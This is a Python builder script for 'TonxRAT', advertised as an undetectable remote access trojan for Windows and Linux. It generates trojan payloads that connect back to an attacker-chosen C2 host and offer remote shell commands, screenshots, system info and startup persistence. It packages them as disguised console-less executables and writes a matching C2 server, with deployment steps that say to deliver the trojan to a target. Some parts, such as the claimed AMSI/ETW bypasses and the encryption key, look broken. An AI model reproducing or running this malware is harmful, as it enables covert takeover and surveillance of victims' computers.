#!/usr/bin/env python3
"""
TonxRAT Builder - Fixed Version
"""

import os
import sys
import subprocess
import base64
import tempfile
import shutil
from pathlib import Path

def print_banner():
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║                  TonxRAT Builder v1.1 - FIXED                ║
    ║             Undetectable RAT for Win/Linux                   ║
    ╚══════════════════════════════════════════════════════════════╝
    """)

def select_platform():
    while True:
        print("\n[1] Windows 10/11")
        print("[2] Ubuntu Linux")
        choice = input("Select target platform (1-2): ").strip()
        if choice == "1":
            return "windows"
        elif choice == "2":
            return "linux"
        print("Invalid choice. Try again.")

def get_rat_name():
    name = input("Enter RAT name (e.g., update.exe): ").strip()
    return name if name else "update"

def get_c2_info():
    host = input("Enter C2 IP/Domain: ").strip()
    port = input("Enter C2 Port (default 443): ").strip() or "443"
    return host, port

def get_favicon():
    use_icon = input("Use custom icon/favicon? (y/n): ").strip().lower()
    if use_icon == 'y':
        path = input("Icon path: ").strip()
        if os.path.exists(path):
            return path
    return None

def generate_windows_payload(name, host, port):
    win_template = f'''import socket, subprocess, os, threading, time, base64, ctypes
from cryptography.fernet import Fernet
import win32crypt, win32api, win32process
import psutil
from PIL import ImageGrab

# Bypass functions
def amsi_bypass():
    ctypes.windll.kernel32.SetThreadpoolThreadMaximum(0)

def etw_bypass():
    ctypes.windll.LoadLibrary("amsi.dll")

amsi_bypass()
etw_bypass()

key = base64.b64decode("{base64.b64encode(b'secret_key_32bytes!!').decode()}")
cipher = Fernet(key)

class TonxRAT:
    def __init__(self, host, port):
        self.host = host
        self.port = int(port)
        self.sock = None
        self.connect()

    def connect(self):
        while True:
            try:
                self.sock = socket.socket()
                self.sock.connect((self.host, self.port))
                self.sock.send(b"TonxRAT/1.0")
                threading.Thread(target=self.listen, daemon=True).start()
                break
            except:
                time.sleep(5)

    def listen(self):
        while True:
            try:
                cmd = self.sock.recv(4096).decode()
                if cmd.startswith("enc:"):
                    cmd = cipher.decrypt(cmd[4:].encode()).decode()

                if cmd == "sysinfo":
                    info = f"Hostname: {{os.getenv('COMPUTERNAME')}}\\\\nUser: {{os.getenv('USERNAME')}}"
                elif cmd == "screenshot":
                    img = ImageGrab.grab()
                    img.save("tmp.png")
                    with open("tmp.png", "rb") as f:
                        info = base64.b64encode(f.read()).decode()
                    os.remove("tmp.png")
                elif cmd.startswith("shell "):
                    result = subprocess.run(cmd[6:], shell=True, capture_output=True, text=True)
                    info = f"STDOUT: {{result.stdout}}STDERR: {{result.stderr}}"
                elif cmd == "persistence":
                    startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', '{name}')
                    shutil.copy(sys.executable, startup)
                    info = "Persistence installed"
                else:
                    info = "Unknown command"

                enc_data = cipher.encrypt(info.encode())
                self.sock.send(f"enc:{{enc_data.decode()}}".encode())
            except:
                break

if __name__ == "__main__":
    rat = TonxRAT('{host}', {port})
'''

    py_file = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False).name
    with open(py_file, 'w') as f:
        f.write(win_template)
    
    dist_dir = f"dist_win_{name}"
    cmd = [
        sys.executable, '-m', 'PyInstaller',
        '--onefile', '--noconsole', '--clean',
        f'--name={name}', '--distpath', dist_dir,
        '--hidden-import=cryptography.fernet',
        '--hidden-import=PIL.ImageGrab',
        py_file
    ]
    
    favicon = get_favicon()
    if favicon:
        cmd.extend(['--icon', favicon])
    
    subprocess.run(cmd, check=True)
    os.unlink(py_file)
    shutil.rmtree('build', ignore_errors=True)
    
    return os.path.join(dist_dir, f"{name}.exe")

def generate_linux_payload(name, host, port):
    linux_template = f'''#!/usr/bin/env python3
import socket, subprocess, os, threading, time, base64, pty, sys
from cryptography.fernet import Fernet

key = base64.b64decode("{base64.b64encode(b'secret_key_32bytes!!').decode()}")
cipher = Fernet(key)

def hide_process():
    try:
        os.system("echo 0 > /proc/sys/kernel/yama/ptrace_scope")
    except: pass

hide_process()

class TonxRAT:
    def __init__(self, host, port):
        self.host = host
        self.port = int(port)
        self.sock = None
        self.connect()

    def connect(self):
        while True:
            try:
                self.sock = socket.socket()
                self.sock.connect((self.host, self.port))
                self.sock.send(b"TonxRAT-Linux/1.0")
                pty.spawn("/bin/bash")
                threading.Thread(target=self.listener, daemon=True).start()
                break
            except:
                time.sleep(5)

    def listener(self):
        while True:
            try:
                cmd = self.sock.recv(4096).decode()
                if cmd.startswith("enc:"):
                    cmd = cipher.decrypt(cmd[4:].encode()).decode()
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                enc_data = cipher.encrypt(f"{{result.stdout}}{{result.stderr}}".encode())
                self.sock.send(f"enc:{{enc_data.decode()}}".encode())
            except:
                break

if __name__ == "__main__":
    rat = TonxRAT('{host}', {port})
'''

    py_file = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False).name
    with open(py_file, 'w') as f:
        f.write(linux_template)
    
    dist_dir = f"dist_linux_{name}"
    cmd = [
        sys.executable, '-m', 'PyInstaller',
        '--onefile', f'--name={name}', '--distpath', dist_dir,
        py_file
    ]
    
    subprocess.run(cmd, check=True)
    os.unlink(py_file)
    shutil.rmtree('build', ignore_errors=True)
    
    return os.path.join(dist_dir, name)

def create_c2_server(host, port):
    c2_template = f'''#!/usr/bin/env python3
import socket, threading, base64
from cryptography.fernet import Fernet

key = base64.b64decode("{base64.b64encode(b'secret_key_32bytes!!').decode()}")
cipher = Fernet(key)

def handle_client(client, addr):
    print(f"New connection: {{addr}}")
    client.send(b"sysinfo")
    while True:
        try:
            data = client.recv(4096)
            if data.startswith(b"enc:"):
                print(cipher.decrypt(data[4:]).decode())
            cmd = input("TonxRAT> ").strip()
            if cmd.lower() in ['exit', 'quit']:
                break
            enc_cmd = cipher.encrypt(cmd.encode())
            client.send(f"enc:{{enc_cmd.decode()}}".encode())
        except:
            break
    client.close()

s = socket.socket()
s.bind(('0.0.0.0', {port}))
s.listen(10)
print(f"TonxRAT C2 Server: 0.0.0.0:{port}")
print("Commands: sysinfo, screenshot, shell <cmd>, persistence")

while True:
    client, addr = s.accept()
    threading.Thread(target=handle_client, args=(client, addr), daemon=True).start()
'''
    
    with open("tonx_c2_server.py", "w") as f:
        f.write(c2_template)
    os.chmod("tonx_c2_server.py", 0o755)
    print("✅ C2 Server: tonx_c2_server.py")

def main():
    print_banner()
    
    platform = select_platform()
    name = get_rat_name()
    host, port = get_c2_info()
    
    print(f"\nBuilding {name} for {platform.title()}...")
    
    if platform == "windows":
        trojan = generate_windows_payload(name, host, port)
    else:
        trojan = generate_linux_payload(name, host, port)
    
    print(f"✅ Trojan: {trojan}")
    create_c2_server(host, port)
    
    print(f"\n🎯 DEPLOYMENT:")
    print(f"1. python tonx_c2_server.py")
    print(f"2. Deploy {trojan} to target")
    print("3. Commands: sysinfo|screenshot|shell dir|persistence")

if __name__ == "__main__":
    main()